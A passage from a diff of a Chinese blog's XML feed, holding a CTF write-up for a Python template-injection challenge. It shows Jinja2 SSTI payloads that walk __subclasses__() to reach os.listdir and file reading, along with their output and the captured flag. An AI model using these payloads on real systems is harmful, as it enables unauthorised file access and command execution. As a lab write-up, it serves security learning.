class="hljs-string">&#x27;werkzeug.local.LocalStack&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.local.LocalProxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;ast.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;difflib.HtmlDiff&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleFactory&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.RuleTemplate&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.BaseConverter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.Map&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.routing.MapAdapter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._FixupStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click._compat._AtomicFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.LazyFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.KeepOpenFile&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.utils.PacifyFlushWrapper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.types.ParamType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Option&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.Argument&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.ParsingState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.parser.OptionParser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.formatting.HelpFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.BaseCommand&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;click.core.Parameter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.signals._FakeSignal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers.locked_cached_property&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.helpers._PackageBoundObject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.DispatchingApp&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.cli.ScriptInfo&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.config.ConfigAttribute&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx._AppCtxGlobals&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.AppContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.ctx.RequestContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.JSONTag&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.sessions.SessionInterface&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json._JSONModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;flask.blueprints.BlueprintSetupState&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext.Extension&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;werkzeug.serving.BaseWSGIServer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;unicodedata.UCD&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;array.array&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method-wrapper&#x27;</span>&gt;] <span class="hljs-keyword">not</span> found<br></code></pre></td></tr></table></figure>
+
+<p>可以在其中找到 &lt;type ‘file’&gt;类型 (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
+<p><strong>还可以看到有一个 &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</strong>，下表是71，构造payload进行命令执行</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">URL http://61.147.171.105:50859/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found<br></code></pre></td></tr></table></figure>
+
+<p>接下来构造读取flag payload</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctf</span>&#123;f22b6844-<span class="hljs-number">5169</span>-<span class="hljs-number">4054</span>-b2a0-d95b9361cb57&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Writeup</tag>
+        <tag>攻防世界</tag>
+        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -2384,56 +2740,6 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界-Web_python_template_injection</title>
-    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
-    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
-<img src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
-
-<p>进入靶机网址提示</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">python <span class="hljs-keyword">template</span> injection<br></code></pre></td></tr></table></figure>
-
-<p>知道这是一道python模板注入</p>
-<p>url输入 </p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/49 not found<br></code></pre></td></tr></table></figure>
-
-<p>判断存在SSTI注入</p>
-<p>查看网站模块，url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">URL http://<span class="hljs-number">61.147</span><span class="hljs-number">.171</span><span class="hljs-number">.105</span>:<span class="hljs-number">50859</span>/[&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.GeneratorContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;contextlib.closing&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.MissingType&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.LRUCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Cycler&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Joiner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.utils.Namespace&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;markupsafe._MarkupEscapeHelper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.EvalContext&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_hashlib.HASH&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.nodes.Node&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_random.Random&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.TemplateReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Environment&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.BlockReference&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextBase&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.LoopContextIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Macro&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.runtime.Undefined&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;numbers.Number&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Decimal&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._ContextManager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal.Context&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._WorkRep&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;decimal._Log10Memoize&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_ast.AST&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Failure&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStreamIterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.TokenStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.lexer.Lexer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.parser.Parser&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.visitor.NodeVisitor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.idtracking.Symbols&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.MacroRef&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.compiler.Frame&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.Template&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateModule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateExpression&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.environment.TemplateStream&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.loaders.BaseLoader&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.Bucket&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;jinja2.bccache.BytecodeCache&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LogRecord&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Formatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.BufferingFormatter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Filterer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.PlaceHolder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.Manager&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;logging.LoggerAdapter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;datetime.date&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span 